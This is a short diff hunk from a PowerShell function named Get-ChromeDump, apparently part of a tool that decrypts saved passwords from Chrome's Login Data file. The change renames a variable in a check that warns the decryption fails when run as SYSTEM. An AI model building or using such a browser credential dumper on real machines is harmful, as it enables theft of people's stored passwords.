@@ -15,7 +15,7 @@ Function Get-ChromeDump{
     #Check to see if cript is being run as SYSTEM. Not going to work.
     if(([System.Security.Principal.WindowsIdentity]GetCurrent()).IsSystem){
       Write-Warning Unable to decrypt passwords contained in Login Data file as SYSTEM.
-      $NoPassword = $True
+      $NoPasswords = $True
     }
 
     if([IntPtr]Size -eq 8)
